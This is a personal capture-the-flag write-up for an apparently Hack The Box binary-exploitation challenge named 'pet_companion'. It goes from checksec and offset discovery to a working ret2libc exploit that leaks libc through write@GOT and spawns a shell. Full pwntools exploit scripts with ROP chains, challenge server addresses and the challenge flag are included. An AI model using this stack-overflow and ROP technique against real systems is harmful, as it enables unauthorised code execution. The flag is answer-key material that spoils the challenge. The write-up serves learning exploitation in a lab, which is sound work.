Seems like a payload injection exploiting a buffer overflow to run a shellcode.

Checking the security:
```bash
checksec --file=pet_companion 

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable     FILE
Full RELRO      No canary found   NX enabled    No PIE         No RPATH   RW-RUNPATH   65 Symbols        No    0  1
pet_companion

```
Seems fine.


First, we need to override the return value like in Rocket Blaster.
```
msf-pattern_create -l 0x100 

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
```

```
*RSP  0x7fffffffdc98 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
 ► 0x4006df <main+149>    ret    <0x6341356341346341>
```

```
msf-pattern_offset -q '0x6341356341346341'
[*] Exact match at offset 72
```

So we need to override at address 72.
I'm going to try to insert the main function address ( ``0040064a`` )

```python
from pwn import *

LOCAL_FILE_PATH: str = "./pet_companion"
REMOTE_SERVER = "83.136.252.62"
REMOTE_PORT = 30929

def pwn_pet_compagnion(proc):
    proc.recvuntil(b"[!] Set your pet companion's current status: ")
    payload = b"A"*72
    payload += p64(0x0040064a)

    # Send the payload
    proc.sendline(payload)
    with open ('input.txt', 'wb') as out:
        out.write(payload)

    print(b"trying payload", payload)
    res = proc.recvall(timeout=2)
    print(bytes.decode(res))

def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_pet_compagnion(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_pet_compagnion(proc)

def main():
    run_bin_local(LOCAL_FILE_PATH)
    #run_remote()

if __name__ == '__main__':
    main()
```

On GDB, running `r < input.txt`, we can see this output:
```
 0x4006df <main+149>    ret    
    ↓
 ► 0x40064a <main>        push   rbp
   0x40064b <main+1>      mov    rbp, rsp
```
The return value has been overwritten, and now jumps to the beginning of the main function.

We now want to replace that address with the beginning of our buffer address, in order to execute the payload we will store in it later.

This image explains nicely how the stack works, and how to write the payload.

![[Pasted image 20240313114443.png]]

I tried to put the buffer address i found:

```
0x4006df       <main+149>    ret    
    ↓
 ► 0x7fffffffdc90               xchg   r8d, eax
```

Quite a weird instruction, maybe it is my `A`s turned into instructions.  
I'm going to put nops inside my buffer, so that will be clearer.

```
0x4006df       <main+149>    ret    <0x7fffffffdc90>
    ↓
   0x7fffffffdc90               nop    
   0x7fffffffdc91               nop    
   0x7fffffffdc92               nop    
   0x7fffffffdc93               nop    
   0x7fffffffdc94               nop
```


Okay, that contains nop ! It works !
Or maybe not ! >.>
When using `ni`,  my program SEGFAULTs...

And i know why !
Remember before ?
```bash
checksec --file=pet_companion 

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable     FILE
Full RELRO      No canary found   NX enabled    No PIE         No RPATH   RW-RUNPATH   65 Symbols        No    0  1
pet_companion

```

NX is enabled !
Here is what NX is:
```
The NX (**No-Execute**) bit is a protection feature on CPUs used by DEP to prevent attackers from executing shellcode (instructions injected and executed by attackers) on the stack, heap, or in data sections.
```

So the program crashes once i jump onto the stack...

Might need to use a different approach !

Hopefully, there is no PIE.
```
PIE stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address.
```

So the adresses remains the same, i just need to run my code from where i'm allowed to.

Seems like i also need to understand what GOT and PLT are !

```
Before a function from the dynamically linked library gets called, its real address is unknown. So, when it is first called, there is a slow lookup function called Procedural Linkage Table (PLT) which will calculate the real address of that function and updates it in the GOT. So, we leverage this activity and try to leak the real address of that function.
```

This guide explains https://fir3wa1-k3r.github.io/2020/02/13/PWNing-binary-with-NX-and-ASLR-protections-enabled.html when ASLR is enabled, so that's probably too advanced now.
But i'm keeping it here as reference for another upcoming challenge :)

Following another guide, i'm getting the addresses of pop rdi/ret, '/bin/sh' string, and the system address inside glibc.

I used python for rdi/ret, and 2 commands for the others under GDB:

```
pwndbg> p system
$2 = {<text variable, no debug info>} 0x7ffff784f420 <system>
```


```
pwndbg> info proc map
process 718203
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
            0x400000           0x401000     0x1000        0x0  r-xp   /home/kali/Documents/ctf/pet_companion/pet_companion
            0x600000           0x601000     0x1000        0x0  r--p   /home/kali/Documents/ctf/pet_companion/pet_companion
            0x601000           0x602000     0x1000     0x1000  rw-p   /home/kali/Documents/ctf/pet_companion/pet_companion
      0x7ffff7800000     0x7ffff79e7000   0x1e7000        0x0  r-xp   /home/kali/Documents/ctf/pet_companion/glibc/libc.so.6
      0x7ffff79e7000     0x7ffff7be7000   0x200000   0x1e7000  ---p   /home/kali/Documents/ctf/pet_companion/glibc/libc.so.6
      0x7ffff7be7000     0x7ffff7beb000     0x4000   0x1e7000  r--p   /home/kali/Documents/ctf/pet_companion/glibc/libc.so.6
      0x7ffff7beb000     0x7ffff7bed000     0x2000   0x1eb000  rw-p   /home/kali/Documents/ctf/pet_companion/glibc/libc.so.6
      0x7ffff7bed000     0x7ffff7bf1000     0x4000        0x0  rw-p   
      0x7ffff7c00000     0x7ffff7c29000    0x29000        0x0  r-xp   /home/kali/Documents/ctf/pet_companion/glibc/ld-linux-x86-64.so.2
      0x7ffff7e29000     0x7ffff7e2a000     0x1000    0x29000  r--p   /home/kali/Documents/ctf/pet_companion/glibc/ld-linux-x86-64.so.2
      0x7ffff7e2a000     0x7ffff7e2b000     0x1000    0x2a000  rw-p   /home/kali/Documents/ctf/pet_companion/glibc/ld-linux-x86-64.so.2
      0x7ffff7e2b000     0x7ffff7e2c000     0x1000        0x0  rw-p   
      0x7ffff7ff7000     0x7ffff7ff9000     0x2000        0x0  rw-p   
      0x7ffff7ff9000     0x7ffff7ffd000     0x4000        0x0  r--p   [vvar]
      0x7ffff7ffd000     0x7ffff7fff000     0x2000        0x0  r-xp   [vdso]
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]

pwndbg> find 0x7ffff7800000,0x7ffff79e7000,"/bin/sh"
	0x7ffff79b3d88
	1 pattern found.

```

I get a segfault exactly like in Rocket Blaster...

And this time, i know why !

I found this article:
https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465

Here is what is (and was) happening:
```
The 64 bit calling convention requires the stack to be 16-byte aligned before a `call` instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. `movaps` triggers a general protection fault when operating on unaligned data, **so try padding your ROP chain with an extra** `**ret**` **before returning into a function or return further into a function to skip a** `**push**` **instruction** [4].
```

The program SEGFAULT on this line:
```
 ► 0x7ffff784f2d6    movaps xmmword ptr [rsp + 0x40], xmm0
```

So this kinda looks like the same issue :)

So i added a padding 'ret' at the start of my payload:
```python
    # Searching for "ret" inside binary
    ret = rop.find_gadget(['ret']).address
    print("ret; addr found:", hex(ret))

    # Building our paylaod
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh)
    payload += p64(system_addr)
    payload += p64(exit_addr)
```


```python
DELETE ME
from pwn import *

LOCAL_FILE_PATH: str = "./pet_companion"
REMOTE_SERVER = "83.136.254.223"
REMOTE_PORT = 31013
libc=ELF("./glibc/libc.so.6", checksec=False)
elf = ELF(LOCAL_FILE_PATH)
rop=ROP(elf)

def pwn_pet_compagnion(proc):
    proc.recvuntil(b"[!] Set your pet companion's current status: ")
    payload = b"A"*72
    
    # This doesn't work because of NX
    # payload += p64(0x7fffffffdc98)

    # /bin/sh string address (gdb -> info proc map -> find x,y,"/bin/sh")
    bin_sh = 0x7ffff79b3d88
    print('/bin/sh address:', hex(bin_sh))

    # System address (gdb -> p system)
    system_addr = 0x7ffff784f420
    print("System address:", hex(system_addr))

    # Exit address
    exit_addr = 0x7ffff7843110

    # Searching for "pop rdi; ret" inside binary
    pop_rdi_ret = rop.find_gadget(['pop rdi','ret'])[0]
    print("pop rdi; ret; addr found:",hex(pop_rdi_ret))

    # Searching for "ret" inside binary
    ret = rop.find_gadget(['ret'])[0]
    print("ret; addr found:", hex(ret))

    # Building our paylaod
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh)
    payload += p64(system_addr)
    #payload += p64(exit_addr)


    # Send the payload
    proc.clean()
    proc.sendline(payload)
    with open ('input.txt', 'wb') as out:
        out.write(payload)

    print(b"trying payload", payload)
    res = proc.recvall(timeout=10)
    
    proc.interactive()

    print(bytes.decode(res))

def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_pet_compagnion(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_pet_compagnion(proc)

def main():
    run_bin_local(LOCAL_FILE_PATH)
    #run_remote()

if __name__ == '__main__':
    main()

```

After some research, i understood 2 things:
- GDB addresses aren't always the same than the real program
- ASLR on the machine can happen even if the binary has no PIE

More explanations about GOT and PLT, since i might need to use them !

```
GOT, or Global Offset Table, holds addresses of functions that are dynamically linked within the binary. These are addresses that aren't known at the time the program was compiled and linked, therefore meaning they don't get resolved until the program actually runs. As such, certain function addresses are provided by a library, or in this case, by libc. The purpose of the GOT is to reduce the time needed to find calls to functions every time they're used, so rather than having to search through the libc library each time, they're stored in a table ready to be reused.

PLT, or Procedure Linkage Table, is pointed to by the GOT. The PLT is effectively a stub that then calls the dynamic linker with the name of the function that's been requested.
```

So, what we have to do is to determine the base address of glibc, since it changes on every run of the binary.

Most of the writeups i've seen uses the "puts function". The issue is that we don't have access to these functions:
```
pwndbg> plt

Section .plt 0x4004e0-0x400520:
0x4004f0: write@plt
0x400500: read@plt
0x400510: setvbuf@plt
```

Instead of puts, i'm going to use "write", since it does mostly the same, it will just require some more parameters.

So i updated my script to this:

```python
def pwn_pet_compagnion(proc):
    # Find gadgets
    pop_rdi_ret = rop.find_gadget(['pop rdi','ret'])[0]

    # Find gadgets
    pop_rsi_r15_ret = rop.find_gadget(['pop rsi', 'pop r15','ret'])[0]

    # Find addresses
    write_plt = vuln_elf.plt['write']
    write_got = vuln_elf.got['write']
    main_plt = vuln_elf.symbols['main']

    # Build the ROP chain to leak libc address
    rop_chain = b""
    rop_chain += b"A" * 72   # Padding to reach RIP overwrite
    rop_chain += p64(pop_rdi_ret)  # Pop rdi; ret
    rop_chain += p64(1)  # File descriptor (stdout)
    rop_chain += p64(pop_rsi_r15_ret)  # Pop rsi; pop r15; ret
    rop_chain += p64(write_got)  # Address of write in GOT
    rop_chain += p64(0)  # Dummy value for r15
    rop_chain += p64(write_plt)  # Call to write function to leak address of write function
    rop_chain += p64(main_plt)   # Return to main

    # Send payload
    proc.recvuntil(b"[!] Set your pet companion's current status: ")
    proc.sendline(rop_chain)


    with open ('input.txt', 'wb') as out:
        out.write(rop_chain)
        print(rop_chain)


    # Receive leaked address
    print(proc.recvuntil(b"[*] Configuring...\n\n"))
    leaked_write = proc.recv(8)
    print("leaked:", leaked_write)
    write_address = u64(leaked_write.strip().ljust(8, b"\x00"))
    print(hex(write_address))
```

Basically, it jumps on the write function, giving the right parameters to it, to print the value of the write function address stored in the GOT.
Then, i'm jumping back to main, to be able to run my previous exploit using the newly leaked memory address.

Now i just had to re-run my script, having my second payload injected once i get back to main.

```python
from pwn import *

LOCAL_FILE_PATH: str = "./pet_companion"
REMOTE_SERVER = "94.237.62.240"
REMOTE_PORT = 43944
libc=ELF("./glibc/libc.so.6", checksec=False)
vuln_elf = ELF(LOCAL_FILE_PATH)
rop=ROP(vuln_elf)

def pwn_pet_compagnion(proc):
    # Find gadgets
    pop_rdi_ret = rop.find_gadget(['pop rdi','ret'])[0]

    # Find gadgets
    pop_rsi_r15_ret = rop.find_gadget(['pop rsi', 'pop r15','ret'])[0]

    # Find addresses
    write_plt = vuln_elf.plt['write']
    write_got = vuln_elf.got['write']
    main_plt = vuln_elf.symbols['main']

    # Build the ROP chain to leak libc address
    rop_chain = b""
    rop_chain += b"A" * 72   # Padding to reach RIP overwrite
    rop_chain += p64(pop_rdi_ret)  # Pop rdi; ret
    rop_chain += p64(1)  # File descriptor (stdout)
    rop_chain += p64(pop_rsi_r15_ret)  # Pop rsi; pop r15; ret
    rop_chain += p64(write_got)  # Address of write in GOT
    rop_chain += p64(0)  # Dummy value for r15
    rop_chain += p64(write_plt)  # Call to write function to leak address of write function
    rop_chain += p64(main_plt)   # Return to main

    # Send payload
    proc.recvuntil(b"[!] Set your pet companion's current status: ")
    proc.sendline(rop_chain)


    with open ('input.txt', 'wb') as out:
        out.write(rop_chain)
        print(rop_chain)


    # Receive leaked address
    print(proc.recvuntil(b"[*] Configuring...\n\n"))
    leaked_write = proc.recv(8)
    print("leaked:", leaked_write)
    write_address = u64(leaked_write.strip().ljust(8, b"\x00"))
    print(hex(write_address))

    # Calculate libc base address
    libc.address = write_address - libc.symbols['write']

    print("Glibc_base:", hex(libc.address))
    proc.clean()
    system_address = libc.symbols['system']
    print(hex(system_address))


    # /bin/sh string address (gdb -> info proc map -> find x,y,"/bin/sh")
    # bin_sh = 0x7ffff79b3d88
    bin_sh = next(libc.search(b"/bin/sh"))
    print('/bin/sh address:', hex(bin_sh))

    # # System address (gdb -> p system)
    # system_addr = 0x7ffff784f420
    system_addr = libc.symbols["system"]
    print("System address:", hex(system_addr))


    # Exit addresslibc_base
    exit_addr = libc.symbols["exit"]
    print("Exit address:", hex(exit_addr))

    # Searching for "ret" inside binary
    ret = rop.find_gadget(['ret'])[0]
    print("ret; addr found:", hex(ret))

    payload = b"A"*64
    # Building our paylaod
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh)
    payload += p64(system_addr)
    payload += p64(exit_addr)

    # Send the payload
    proc.clean()
    proc.sendline(payload)

    # with open ('input.txt', 'wb') as out:
    #     out.write(payload)

    print(b"trying payload", payload)
    
    proc.interactive()

    res = proc.recvall(timeout=10)
    print(bytes.decode(res))


def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_pet_compagnion(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_pet_compagnion(proc)

def main():
    #run_bin_local(LOCAL_FILE_PATH)
    run_remote()

if __name__ == '__main__':
    main()
```

And that gives us a shell, allowing us to use the command `cat flag.txt` and get the flag !

Gosh, that was a hard one ! :)
`HTB{c0nf1gur3_w3r_d0g}`
